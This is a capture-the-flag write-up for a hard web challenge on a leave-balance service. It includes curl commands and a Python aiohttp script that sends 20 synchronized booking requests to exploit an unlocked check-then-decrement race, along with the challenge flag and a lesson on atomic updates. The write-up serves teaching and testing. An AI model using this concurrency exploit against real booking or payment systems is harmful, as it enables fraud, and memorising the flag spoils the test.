# Leave Balance Race Condition

**Challenge title:** Solde de Congés\
**Category:** Web\
**Difficulty:** Hard\
**Points:** 175\
**Author:** Perceval

## Target

`https://solde-conges.cyberzerk.fr`

The challenge exposes three endpoints:

- `POST /start` — creates a session with an initial leave balance of one day
- `POST /book` — consumes one day of leave
- `GET /flag` — returns the flag when the balance becomes negative

## Solution

### 1. Start a session

Send a POST request to `/start`:

```powershell
curl.exe -i -X POST "https://solde-conges.cyberzerk.fr/start"
```

The response sets a `sess` cookie and returns a JSON object containing a `nonce` and an initial balance of `1`.

Use the cookie and nonce returned by your own session for the remaining requests.

### 2. Confirm the booking request format

A single booking request uses the session cookie and JSON nonce:

```powershell
curl.exe -i -X POST "https://solde-conges.cyberzerk.fr/book" `
  -H "Cookie: sess=YOUR_SESSION_COOKIE" `
  -H "Content-Type: application/json" `
  -d '{"nonce":"YOUR_NONCE"}'
```

A successful single booking returned:

```json
{"solde":0}
```

### 3. Exploit the race condition

The page source disclosed the implementation flaw in its developer note:

> Verification followed by decrement, without a lock.

The balance check and decrement were not synchronized. Concurrent requests could therefore pass the balance check before the updates completed, allowing the balance to become negative.

Install the Python dependency:

```powershell
python -m pip install aiohttp
```

Create and run the following script. Replace the cookie and nonce with the values from a fresh `/start` response:

```python
import asyncio
import aiohttp

URL = "https://solde-conges.cyberzerk.fr"
COOKIE = "YOUR_SESSION_COOKIE"
NONCE = "YOUR_NONCE"
REQUESTS = 20

async def main():
    cookies = {"sess": COOKIE}
    payload = {"nonce": NONCE}
    gate = asyncio.Event()

    async with aiohttp.ClientSession(cookies=cookies) as session:
        async def book(i):
            await gate.wait()
            async with session.post(f"{URL}/book", json=payload) as response:
                result = await response.text()
                print(f"Request {i}: HTTP {response.status} | {result}")

        tasks = [
            asyncio.create_task(book(i))
            for i in range(1, REQUESTS + 1)
        ]

        await asyncio.sleep(0.2)
        gate.set()
        await asyncio.gather(*tasks)

        async with session.get(f"{URL}/flag") as response:
            print("\\nFLAG RESPONSE:")
            print("HTTP", response.status)
            print(await response.text())

asyncio.run(main())
```

The event gate released all 20 asynchronous booking tasks together. In the successful run, the responses included negative balances, with the lowest reported value reaching `-5`.

### 4. Retrieve the flag

The script then requested `GET /flag` using the same session. The server returned HTTP 200 and the flag.

## Flag

```text
CyberZerk{r4c3_c0nd1t10n_s0ld3_n3g4t1f_000a2c0667}
```

## Security Lesson

A balance check followed by a decrement must be performed atomically. Concurrent booking operations should use a database transaction with appropriate row locking or an atomic conditional update, for example an update that decrements the balance only when the current balance is at least one. The application must also enforce the invariant that a leave balance cannot become negative.
